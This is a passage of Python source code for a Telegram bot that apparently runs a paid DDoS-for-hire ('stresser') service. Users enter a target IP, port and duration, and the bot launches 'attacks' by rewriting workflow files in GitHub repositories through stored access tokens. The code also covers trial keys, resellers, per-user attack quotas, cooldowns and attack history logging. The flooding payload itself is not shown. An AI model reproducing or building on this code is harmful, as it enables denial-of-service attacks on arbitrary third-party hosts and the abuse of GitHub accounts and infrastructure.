 txt=f"╔════════════════════════╗\n║  {sc('YOUR ACCESS INFO')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('ACCOUNT DETAILS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ 👤 {sc('Role')}: {role}\n├ 👤 {sc('Name')}: {q.from_user.first_name}\n├ 👤 {sc('Username')}: @{q.from_user.username or'None'}\n├ 📅 {sc('Expiry')}: {expiry}\n├ 🎯 {sc('Attacks')}: {remaining}/{MAX_ATTACKS}\n└ ✅ {sc('Status')}: {status}"
 kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def help_menu(q):
 txt=f"╔═══════════════════════╗\n║  {sc('HELP & COMMANDS')}  ║\n╚═══════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('BASIC COMMANDS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n/start - {sc('Main menu')}\n/id - {sc('Get your ID')}\n/myaccess - {sc('Check access')}\n/help - {sc('Show help')}\n/redeem <key> - {sc('Redeem trial')}\n\n💡 {sc('Use buttons for more features')}"
 kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def status_menu(q):
 uid=q.from_user.id;attack_active="🔴 YES"if current_attack else"🟢 NO"
 cd_active="🔴 YES"if time.time()<cooldown_until else"🟢 NO"
 if current_attack:
  tleft=int(current_attack['end_time']-time.time())
  attack_info=f"🎯 {current_attack['ip']}:{current_attack['port']} | ⏳ {tleft}s"
 else:attack_info="ɴᴏɴᴇ"
 if time.time()<cooldown_until:cd_info=f"⏳ {int(cooldown_until-time.time())}s"
 else:cd_info="ʀᴇᴀᴅʏ"
 txt=f"╔════════════════════════╗\n║  📡 {sc('SYSTEM STATUS')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('BOT STATUS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ 🤖 {sc('Bot')}: 🟢 ᴏɴʟɪɴᴇ\n├ 🔧 {sc('Maintenance')}: {'🔴 ON'if MAINTENANCE else'🟢 OFF'}\n├ ⏳ {sc('Cooldown')}: {COOLDOWN}s\n└ 🎯 {sc('Max Attacks')}: {MAX_ATTACKS}\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('ATTACK STATUS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ 📡 {sc('Active Attack')}: {attack_active}\n├ 🎯 {sc('Current')}: {attack_info}\n├ 🔄 {sc('Cooldown Active')}: {cd_active}\n└ ⏳ {sc('Cooldown')}: {cd_info}\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('SERVER STATUS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ 🔑 {sc('Servers')}: {len(tokens)}\n├ 👥 {sc('Users')}: {len(approved)}\n├ 👑 {sc('Owners')}: {len(owners)}\n└ ⚡ {sc('Admins')}: {len(admins)}"
 kb=[[InlineKeyboardButton(f"🔄 {sc('Refresh')}",callback_data="status")],[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def handle_text(update:Update,context:ContextTypes.DEFAULT_TYPE):
 global current_attack,cooldown_until
 uid=update.effective_user.id;txt=update.message.text
 if not can_attack(uid):return
 if context.user_data and context.user_data.get('waiting_attack'):
  parts=txt.split()
  if len(parts)!=3:await update.message.reply_text(f"❌ {sc('Invalid format')}. {sc('Use')}: IP PORT TIME");return
  ip,port,tm=parts
  try:port=int(port);tm=int(tm)
  except:await update.message.reply_text(f"❌ {sc('Port and time must be numbers')}");return
  if tm<1 or tm>300:await update.message.reply_text(f"❌ {sc('Time must be between 1-300 seconds')}");return
  if current_attack:await update.message.reply_text(f"❌ {sc('Another attack is running')}");return
  if time.time()<cooldown_until:cd_left=int(cooldown_until-time.time());await update.message.reply_text(f"⏳ {sc('Cooldown active')}. {sc('Wait')} {cd_left}s");return
  if user_counts.get(str(uid),0)>=MAX_ATTACKS:await update.message.reply_text(f"❌ {sc('Attack limit reached')}");return
  msg=await update.message.reply_text(f"⚙️ {sc('Starting attack')}...");success_count=0
  for tkn in tokens:
   if'token'in tkn and'repo'in tkn:
    if update_yml(tkn['token'],tkn['repo'],ip,port,tm):success_count+=1
  if success_count>0:
   current_attack={'ip':ip,'port':port,'time':tm,'end_time':time.time()+tm,'user_id':uid,'username':update.effective_user.username or update.effective_user.first_name}
   cooldown_until=time.time()+tm+COOLDOWN;user_counts[str(uid)]=user_counts.get(str(uid),0)+1;sv('user_attack_counts.json',user_counts)
   history=ld('attack_history.json',[]);history.append({'user_id':uid,'username':update.effective_user.username or update.effective_user.first_name,'ip':ip,'port':port,'time':tm,'date':time.strftime("%Y-%m-%d %H:%M:%S")})
   sv('attack_history.json',history)
   await msg.edit_text(f"╔════════════════════════╗\n║  ✅ {sc('ATTACK LAUNCHED')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('ATTACK DETAILS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ 🎯 {sc('Target')}: {ip}:{port}\n├ ⏱️ {sc('Duration')}: {tm}s\n├ 🔑 {sc('Servers')}: {success_count}\n└ ⏳ {sc('Cooldown')}: {COOLDOWN}s\n\n🚀 {sc('Attack is running')}...")
  else:await msg.edit_text(f"❌ {sc('Failed to start attack')}")
  context.user_data['waiting_attack']=False
async def handle_file(update:Update,context:ContextTypes.DEFAULT_TYPE):
 uid=update.effective_user.id
 if not is_owner(uid):return
 doc=update.message.document
 if doc.file_name.endswith('.txt'):
  file=await context.bot.get_file(doc.file_id);content=await file.download_as_bytearray();lines=content.decode('utf-8').strip().split('\n');added=0
  for line in lines:
   parts=line.strip().split('|')
   if len(parts)==2:
    token,repo=parts
    if not any(t.get('token')==token for t in tokens):tokens.append({'token':token.strip(),'repo':repo.strip(),'added_date':time.strftime("%Y-%m-%d %H:%M:%S")});added+=1
  sv('github_tokens.json',tokens);await update.message.reply_text(f"✅ {sc('Added')} {added} {sc('servers')}")
async def button_handler(update:Update,context:ContextTypes.DEFAULT_TYPE):
 q=update.callback_query;await q.answer();data=q.data
 if data=="main_menu":await start(update,context)
 elif data=="attack_panel":await show_attack_panel(q)
 elif data=="launch_attack":await launch_attack(q)
 elif data=="stop_attack":await stop_attack_handler(q)
 elif data=="attack_history":await attack_history(q)
 elif data=="attack_logs":await attack_logs(q)
 elif data=="attack_settings":await attack_settings(q)
 elif data=="manage_users":await manage_users(q)
 elif data=="show_approved":await show_approved(q)
 elif data=="show_pending":await show_pending(q)
 elif data=="stats":await stats(q)
 elif data=="servers":await servers(q)
 elif data=="trial_keys":await trial_keys_menu(q)
 elif data=="generate_trial":await generate_trial_menu(q)
 elif data=="view_trial_keys":await view_trial_keys(q)
 elif data=="admin_panel":await admin_panel(q)
 elif data=="my_access":await my_access(q)
 elif data=="help":await help_menu(q)
 elif data=="status":await status_menu(q)
 elif data.startswith("gen_trial_"):
  hrs=int(data.split("_")[-1]);key=gen_trial(hrs)
  txt=f"╔════════════════════════╗\n║  ✅ {sc('KEY GENERATED')}  ║\n╚════════════════════════╝\n\n🎫 {sc('Trial Key')}: `{key}`\n⏰ {sc('Duration')}: {hrs} {sc('hours')}\n\n💡 {sc('Share this key with users')}\n📝 {sc('Redeem')}: /redeem {key}"
  kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="trial_keys")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
 elif data=="toggle_maintenance":
  global MAINTENANCE;MAINTENANCE=not MAINTENANCE;sv('maintenance.json',{"maintenance":MAINTENANCE})
  txt=f"✅ {sc('Maintenance')}: {'🔴 ON'if MAINTENANCE else'🟢 OFF'}";kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="attack_settings")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def id_cmd(update:Update,context:ContextTypes.DEFAULT_TYPE):
 uid=update.effective_user.id
 txt=f"╔════════════════════════╗\n║  🆔 {sc('YOUR ID')}  ║\n╚════════════════════════╝\n\n👤 {sc('User ID')}: `{uid}`\n\n💡 {sc('Share this with admin for access')}"
 await update.message.reply_text(txt)
async def myaccess_cmd(update:Update,context:ContextTypes.DEFAULT_TYPE):
 uid=update.effective_user.id
 if is_owner(uid):role="👑 ᴏᴡɴᴇʀ";expiry="ʟɪғᴇᴛɪᴍᴇ"
 elif is_admin(uid):role="⚡ ᴀᴅᴍɪɴ";expiry="ʟɪғᴇᴛɪᴍᴇ"
 elif is_reseller(uid):role="💎 ʀᴇsᴇʟʟᴇʀ";expiry="ʟɪғᴇᴛɪᴍᴇ"
 elif is_approved(uid):
  role="✨ ᴜsᴇʀ";udata=approved.get(str(uid),{});exp=udata.get('expiry',0)
  if exp=="LIFETIME":expiry="ʟɪғᴇᴛɪᴍᴇ"
  else:dleft=int((exp-time.time())/86400);hleft=int(((exp-time.time())%86400)/3600);expiry=f"{dleft}ᴅ {hleft}ʜ"
 else:role="⏳ ᴘᴇɴᴅɪɴɢ";expiry="ᴡᴀɪᴛɪɴɢ"
 remaining=MAX_ATTACKS-user_counts.get(str(uid),0);status="🟢 ᴀᴄᴛɪᴠᴇ"if can_attack(uid)else"🔴 ɪɴᴀᴄᴛɪᴠᴇ"
 txt=f"╔════════════════════════╗\n║  {sc('YOUR ACCESS INFO')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('ACCOUNT DETAILS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ 👤 {sc('Role')}: {role}\n├ 👤 {sc('Name')}: {update.effective_user.first_name}\n├ 👤 {sc('Username')}: @{update.effective_user.username or'None'}\n├ 📅 {sc('Expiry')}: {expiry}\n├ 🎯 {sc('Attacks')}: {remaining}/{MAX_ATTACKS}\n└ ✅ {sc('Status')}: {status}"
 await update.message.reply_text(txt)
async def add_cmd(update:Update,context:ContextTypes.DEFAULT_TYPE):
 uid=update.effective_user.id
 if not is_owner(uid)and not is_admin(uid):await update.message.reply_text(f"❌ {sc('Access denied')}");return
 if len(context.args)<2:await update.message.reply_text(f"❌ {sc('Usage')}: /add <id> <days>");return
 try:
  tid=int(context.args[0]);days=int(context.args[1])
  pending[:]=[u for u in pending if str(u['user_id'])!=str(tid)];sv('pending_users.json',pending)
  if days==0:exp="LIFETIME"
  else:exp=time.time()+(days*86400)
  approved[str(tid)]={"username":f"user_{tid}","added_by":uid,"added_date":time.strftime("%Y-%m-%d %H:%M:%S"),"expiry":exp,"days":days}
  sv('approved_users.json',approved)
  try:
   msg=f"╔════════════════════════╗\n║  {sc('ACCESS APPROVED')}  ║\n╚════════════════════════╝\n\n🎉 {sc('Access granted for')} {days} {sc('days')}\n💡 {sc('Use')} /start {sc('to begin')}"
   await context.bot.send_message(chat_id=tid,text=msg)
  except:pass
  txt=f"╔════════════════════╗\n║  {sc('USER ADDED')}  ║\n╚════════════════════╝\n\n✅ {sc('Successfully added')}\n├ 🆔 {sc('ID')}: {tid}\n└ ⏱️ {sc('Days')}: {days}"
  await update.message.reply_text(txt)
 except:await update.message.reply_text(f"❌ {sc('Invalid format')}")
async def remove_cmd(update:Update,context:ContextTypes.DEFAULT_TYPE):
 uid=update.effective_user.id
 if not is_owner(uid)and not is_admin(uid):await update.message.reply_text(f"❌ {sc('Access denied')}");return
 if len(context.args)<1:await update.message.reply_text(f"❌ {sc('Usage')}: /remove <id>");return
 try:
  tid=str(context.args[0])
  if tid in approved:del approved[tid];sv('approved_users.json',approved);txt=f"╔════════════════════╗\n║  {sc('USER REMOVED')}  ║\n╚════════════════════╝\n\n✅ {sc('Successfully removed')}\n└ 🆔 {sc('ID')}: {tid}";await update.message.reply_text(txt)
  else:await update.message.reply_text(f"❌ {sc('User not found')}")
 except:await update.message.reply_text(f"❌ {sc('Error occurred')}")
async def redeem_cmd(update:Update,context:ContextTypes.DEFAULT_TYPE):
 uid=update.effective_user.id
 if len(context.args)!=1:await update.message.reply_text(f"❌ {sc('Usage')}: /redeem <key>");return
 key=context.args[0].upper();success,message=redeem_trial(key,uid)
 if success:txt=f"╔════════════════════════╗\n║  {sc('TRIAL ACTIVATED')}  ║\n╚════════════════════════╝\n\n✅ {message}\n\n💡 {sc('Use')} /start {sc('to begin')}";await update.message.reply_text(txt)
 else:txt=f"╔════════════════════╗\n║  {sc('REDEMPTION FAILED')}  ║\n╚════════════════════╝\n\n❌ {message}";await update.message.reply_text(txt)
async def help_cmd(update:Update,context:ContextTypes.DEFAULT_TYPE):
 uid=update.effective_user.id
 txt=f"╔═══════════════════════╗\n║  {sc('HELP & COMMANDS')}  ║\n╚═══════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('BASIC COMMANDS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n/start - {sc('Main menu')}\n/id - {sc('Get your ID')}\n/myaccess - {sc('Check access')}\n/help - {sc('Show help')}\n/redeem <key> - {sc('Redeem trial')}\n\n"
 if is_owner(uid)or is_admin(uid):txt+=f"┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('ADMIN COMMANDS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n/add <id> <days> - {sc('Add user')}\n/remove <id> - {sc('Remove user')}\n\n"
 txt+=f"💡 {sc('Use buttons for more features')}"
 await update.message.reply_text(txt)
def main():
 app=Application.builder().token(BOT_TOKEN).build()
 app.add_handler(CallbackQueryHandler(button_handler))
 app.add_handler(CommandHandler("start",start))
 app.add_handler(CommandHandler("id",id_cmd))
 app.add_handler(CommandHandler("myaccess",myaccess_cmd))
 app.add_handler(CommandHandler("add",add_cmd))
 app.add_handler(CommandHandler("remove",remove_cmd))
 app.add_handler(CommandHandler("redeem",redeem_cmd))
 app.add_handler(CommandHandler("help",help_cmd))
 app.add_handler(MessageHandler(filters.Document.ALL,handle_file))
 app.add_handler(MessageHandler(filters.TEXT&~filters.COMMAND,handle_text))
 print("╔════════════════════════════╗")
 print(f"║  {sc('BOT IS RUNNING')}...  ║")
 print("╚════════════════════════════╝")
 print(f"👑 {sc('Owners')}: {len(owners)}")
 print(f"⚡ {sc('Admins')}: {len(admins)}")
 print(f"📊 {sc('Users')}: {len(approved)}")
 print(f"💎 {sc('Resellers')}: {len(resellers)}")
 print(f"🔑 {sc('Servers')}: {len(tokens)}")
 print(f"🔧 {sc('Maintenance')}: {'🔴 ON'if MAINTENANCE else'🟢 OFF'}")
 print(f"⏳ {sc('Cooldown')}: {COOLDOWN}s")
 print(f"🎯 {sc('Max attacks')}: {MAX_ATTACKS}")
 app.run_polling()
if __name__=='__main__':main()
